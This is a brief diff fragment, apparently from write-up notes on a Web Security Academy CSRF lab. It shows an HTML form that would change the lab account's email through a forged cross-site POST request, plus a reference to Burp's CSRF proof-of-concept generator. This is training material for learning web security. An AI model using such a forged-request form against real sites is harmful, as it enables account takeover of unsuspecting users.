@@ -28,7 +28,6 @@ Right click > engagement tools > generate CSRF POC
 </script>
 ```
 
-[Code 3]
 ```html
 <form class="login-form" name="change-email-form" action="https://0a68004904ce1aa980b503e000d70043.web-security-academy.net/my-account/change-email" method="POST">
     <input type="hideen" name="email" value="sivenga@sivenga.com">
